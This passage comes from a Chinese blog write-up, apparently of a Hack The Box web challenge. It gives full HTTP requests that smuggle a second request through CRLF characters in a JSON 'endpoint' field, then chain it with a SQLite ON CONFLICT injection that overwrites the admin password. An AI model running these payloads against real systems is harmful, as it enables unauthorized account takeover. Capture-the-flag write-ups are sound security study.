<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/weather</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:1337</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,ko;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>W/&quot;40a-17749845bb8&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Thu, 28 Jan 2021 15:02:27 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>376</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;endpoint&quot;:&quot;127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012029\u010D\u010A\u010D\u010Ausername=lemon&amp;password=lemon\u010D\u010A\u010D\u010AGET\u0120/&quot;,&quot;city&quot;:&quot;1&quot;,&quot;country&quot;: &quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>然后去docker上下载一个sqlite，查看一下表：</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gye5g4vyq2j30io06yjrt.jpg" alt=""></p>
<p>可以看到已经注册成功了（admin的用户密码之前已经被我打过了，所以密码不是随机值了）</p>
<h4 id="sql注入的利用手法"><a href="#sql注入的利用手法" class="headerlink" title="sql注入的利用手法"></a>sql注入的利用手法</h4><p>[使用INSERT ON CONFLICT覆盖写入数据][<a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/162380.html?utm_content=g_1000230851&amp;spm=5176.20966629.toubu.3.f2991ddcpxxvD1#title-ddu-6dl-bey">https://help.aliyun.com/document_detail/162380.html?utm_content=g_1000230851&amp;spm=5176.20966629.toubu.3.f2991ddcpxxvD1#title-ddu-6dl-bey</a>]</p>
<p>利用手法就是利用冲突来修改admin的密码，当我们注册的时候，再次注册admin用户即会产生冲突。</p>
<p>演示如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into users(username, password) values(&#39;lemon&#39;, &#39;lemon&#39;) on conflict(username) do update set password&#x3D;&#39;admin&#39;;</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gye4fd58hfj31eu04gmxp.jpg" alt=""></p>
<h4 id="组合拳修改admin密码"><a href="#组合拳修改admin密码" class="headerlink" title="组合拳修改admin密码"></a>组合拳修改admin密码</h4><p>还是像之前一样构造一个注册报文，不过payload需要改成带有sql注入的语句，sql注入的payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin&amp;password&#x3D;admin&#39;) on conflict(username) do update set password&#x3D;&#39;lemon_admin&#39; #</span><br></pre></td></tr></table></figure>
<p>body处的payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;endpoint&quot;:&quot;127.0.0.1&#x2F;\u0120HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120&#x2F;register\u0120HTTP&#x2F;1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application&#x2F;x-www-form-urlencoded\u010D\u010AContent-Length:\u012099\u010D\u010A\u010D\u010Ausername&#x3D;admin&amp;password&#x3D;admin&#39;)+on+conflict(username)+do+update+set+password&#x3D;%27lemon_admin%27--+\u010D\u010A\u010D\u010AGET\u0120&#x2F;&quot;,&quot;city&quot;:&quot;1&quot;,&quot;country&quot;: &quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>发包报文如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/weather</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:1337</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,ko;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>W/&quot;40a-17749845bb8&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Thu, 28 Jan 2021 15:02:27 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>460</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;endpoint&quot;:&quot;127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012099\u010D\u010A\u010D\u010Ausername=admin&amp;password=admin&#x27;)+on+CONFLICT(username)+do+update+set+password=%27lemon_admin%27--+\u010D\u010A\u010D\u010AGET\u0120/&quot;,&quot;city&quot;:&quot;1&quot;,&quot;country&quot;: &quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>密码已经成功修改：</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gye546pxluj30cw02u0sq.jpg" alt=""></p>
<!-- flag of hidden posts --></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/09/HTB-challenge-web/">http://example.com/2022/01/09/HTB-challenge-web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">Alex's blog~</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/web/">web</a></div><nav id="pagination"></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2025 By Alex</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>